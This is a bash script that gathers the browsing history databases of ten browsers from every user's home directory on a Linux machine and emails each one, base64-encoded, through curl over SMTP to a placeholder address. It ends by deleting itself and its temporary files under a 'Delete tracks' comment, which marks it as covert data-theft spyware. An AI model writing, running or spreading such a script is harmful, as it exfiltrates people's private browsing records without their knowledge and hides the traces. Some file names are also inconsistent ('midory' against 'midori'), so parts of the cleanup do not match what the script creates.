#Get host name
HOSTNAME=$(hostname)
#Set email from
EMAIL_FROM='test@test.com'
EMAIL_FROM_PASS='test'
#Set email to
EMAIL_TO='test.test@test.com'
SMTP_URL='smtp://smtp.test.com:587'

#Send Chromium history
for user_home in /home/*; do
  CH_HISTORY_FILE="$user_home/.config/chromium/Default/History"
  #Check if the file exists and is not empty
  if [ -f "$CH_HISTORY_FILE" ] && [ -s "$CH_HISTORY_FILE" ]; then
    cp --force "$CH_HISTORY_FILE" /tmp/chromium_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Chromium browser history
Content-Type: application/octet-stream; name="chromium_history_$(basename $user_home)"
Content-Disposition: attachment; filename="chromium_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 /tmp/chromium_history_$(basename $user_home))
EOF
  fi
done
 
#Send Edge history
for user_home in /home/*; do
  E_HISTORY_FILE="$user_home/.config/microsoft-edge/Default/History"
  #Check if the file exists and is not empty
  if [ -f "$E_HISTORY_FILE" ] && [ -s "$E_HISTORY_FILE" ]; then
    cp --force "$E_HISTORY_FILE" /tmp/edge_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Edge browser history
Content-Type: application/octet-stream; name="edge_history_$(basename $user_home)"
Content-Disposition: attachment; filename="edge_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 /tmp/edge_history_$(basename $user_home))
EOF
  fi
done

#Send Waterfox history
for user_home in /home/*; do
  W_HISTORY_FILE="$user_home/.waterfox/default/Places.sqlite"
  #Check if the file exists and is not empty
  if [ -f "$W_HISTORY_FILE" ] && [ -s "$W_HISTORY_FILE" ]; then
    cp --force "$W_HISTORY_FILE" /tmp/waterfox_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Waterfox browser history
Content-Type: application/octet-stream; name="waterfox_history_$(basename $user_home)"
Content-Disposition: attachment; filename="waterfox_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 /tmp/waterfox_history_$(basename $user_home))
EOF
  fi
done

#Send Chrome history
for user_home in /home/*; do
  C_HISTORY_FILE="$user_home/.config/google-chrome/Default/History"
  #Check if the file exists and is not empty
  if [ -f "$C_HISTORY_FILE" ] && [ -s "$C_HISTORY_FILE" ]; then
    cp --force "$C_HISTORY_FILE" /tmp/chrome_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Chrome browser history
Content-Type: application/octet-stream; name="chrome_history_$(basename $user_home)"
Content-Disposition: attachment; filename="chrome_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 /tmp/chrome_history_$(basename $user_home))
EOF
  fi
done

#Send Vivaldi history
for user_home in /home/*; do
  V_HISTORY_FILE="$user_home/.config/vivaldi/Default/History"
  #Check if the file exists and is not empty
  if [ -f "$V_HISTORY_FILE" ] && [ -s "$V_HISTORY_FILE" ]; then
    cp --force "$V_HISTORY_FILE" /tmp/vivaldi_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Vivaldi browser history
Content-Type: application/octet-stream; name="vivaldi_history_$(basename $user_home)"
Content-Disposition: attachment; filename="vivaldi_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 /tmp/vivaldi_history_$(basename $user_home))
EOF
  fi
done

#Send Brave history
for user_home in /home/*; do
  B_HISTORY_FILE="$user_home/.config/BraveSoftware/Brave-Browser/Default/History"
  #Check if the file exists and is not empty
  if [ -f "$B_HISTORY_FILE" ] && [ -s "$B_HISTORY_FILE" ]; then
    cp --force "$B_HISTORY_FILE" /tmp/brave_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Brave browser history
Content-Type: application/octet-stream; name="brave_history_$(basename $user_home)"
Content-Disposition: attachment; filename="brave_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 /tmp/brave_history_$(basename $user_home))
EOF
  fi
done

#Send Opera history
for user_home in /home/*; do
  O_HISTORY_FILE="$user_home/.config/opera/History"
  #Check if the file exists and is not empty
  if [ -f "$O_HISTORY_FILE" ] && [ -s "$O_HISTORY_FILE" ]; then
    cp --force "$O_HISTORY_FILE" /tmp/opera_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Opera browser history
Content-Type: application/octet-stream; name="opera_history_$(basename $user_home)"
Content-Disposition: attachment; filename="opera_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 /tmp/opera_history_$(basename $user_home))
EOF
  fi
done

#Send Midori history
for user_home in /home/*; do
  M_HISTORY_FILE="$user_home/.local/share/midori/history.db"
  #Check if the file exists and is not empty
  if [ -f "$M_HISTORY_FILE" ] && [ -s "$M_HISTORY_FILE" ]; then
    cp --force "$M_HISTORY_FILE" /tmp/midory_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Midori browser history
Content-Type: application/octet-stream; name="midory_history_$(basename $user_home)"
Content-Disposition: attachment; filename="midori_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 /tmp/midori_history_$(basename $user_home))
EOF
  fi
done

#Send Konqueror history
for user_home in /home/*; do
  K_HISTORY_FILE="$user_home/.local/share/konqueror/konq_history"
  #Check if the file exists and is not empty
  if [ -f "$K_HISTORY_FILE" ] && [ -s "$K_HISTORY_FILE" ]; then
    cp --force "$K_HISTORY_FILE" /tmp/konqueror_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Konqueror browser history
Content-Type: application/octet-stream; name="konqueror_history_$(basename $user_home)"
Content-Disposition: attachment; filename="konqueror_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 /tmp/konqueror_history_$(basename $user_home))
EOF
  fi
done

#Send Firefox history
for user_home in /home/*; do
  F_HISTORY_FILE=$(find $user_home/.mozilla/firefox/ -name places.sqlite)
  #Check if the file exists and is not empty
  if [ -f "$F_HISTORY_FILE" ] && [ -s "$F_HISTORY_FILE" ]; then
    cp --force "$F_HISTORY_FILE" /tmp/firefox_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Firefox browser history
Content-Type: application/octet-stream; name="firefox_history_$(basename $user_home)"
Content-Disposition: attachment; filename="firefox_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 /tmp/firefox_history_$(basename $user_home))
EOF
  fi
done

#Delete tracks
rm -f gbhl.sh
rm -f /tmp/*_history
